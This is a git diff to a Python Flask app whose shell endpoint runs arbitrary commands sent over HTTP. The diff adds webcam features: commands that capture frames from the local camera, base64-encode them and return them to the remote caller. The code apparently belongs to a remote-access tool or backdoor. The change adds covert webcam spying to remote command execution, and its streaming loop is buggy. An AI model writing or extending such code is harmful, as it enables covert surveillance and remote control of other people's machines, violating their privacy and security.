@@ -1,3 +1,4 @@
+import threading
 from flask import Flask, jsonify, request
 import subprocess
 import os
@@ -8,6 +9,8 @@ from firebase_admin import credentials, db
 import socket
 import getpass
 import dotenv
+import cv2
+import base64
 
 # Load environment variables from .env file
 dotenv.load_dotenv()
@@ -104,7 +107,64 @@ def handle_shell():
                     return jsonify({"error": f"Directory not found: {new_dir}"}), 400
             except Exception as e:
                 return jsonify({"error": str(e)}), 400
-        
+
+        # Camera streaming logic
+        if command.lower() == "start microsoft.windows.camera:":
+            if not hasattr(app, "camera_streaming"):
+                app.camera_streaming = False
+
+            def gen_frames():
+                cap = cv2.VideoCapture(0)
+                frames = []
+                while getattr(app, "camera_streaming", False):
+                    ret, frame = cap.read()
+                    if not ret:
+                        break
+                    frame = cv2.resize(frame, (320, 240))
+                    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 30]
+                    _, buffer = cv2.imencode('.jpg', frame, encode_param)
+                    jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+                    frames.append(jpg_as_text)
+                cap.release()
+                return frames
+
+            app.camera_streaming = True
+            frames = gen_frames()
+            app.camera_streaming = False
+
+            return jsonify({
+                "output": "Camera streaming frames captured.",
+                "frames": frames,
+                "current_directory": current_directory
+            })
+
+        # Camera capture logic
+        if command.lower() == "get camera frame":
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cap.release()
+            
+            if not ret:
+                return jsonify({"error": "Failed to capture frame"}), 500
+                
+            # Resize for bandwidth efficiency
+            frame = cv2.resize(frame, (640, 480))
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
+            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+            
+            return jsonify({
+                "frame": jpg_as_text,
+                "current_directory": current_directory
+            })
+
+        if command.lower() == "stop camera":
+            if hasattr(app, "camera_streaming"):
+                app.camera_streaming = False
+            return jsonify({
+                "output": "Camera streaming stopped.",
+                "current_directory": current_directory
+            })
+
         # Execute other commands in a new subprocess
         result = subprocess.run(
             command,
@@ -113,14 +173,14 @@ def handle_shell():
             capture_output=True,
             text=True
         )
-        
+
         output = result.stdout if result.stdout else result.stderr
-        
+
         return jsonify({
             "output": output,
             "current_directory": current_directory
         })
-        
+
     except Exception as e:
         logging.error(f"Command execution error: {e}")
         return jsonify({"error": str(e)}), 500
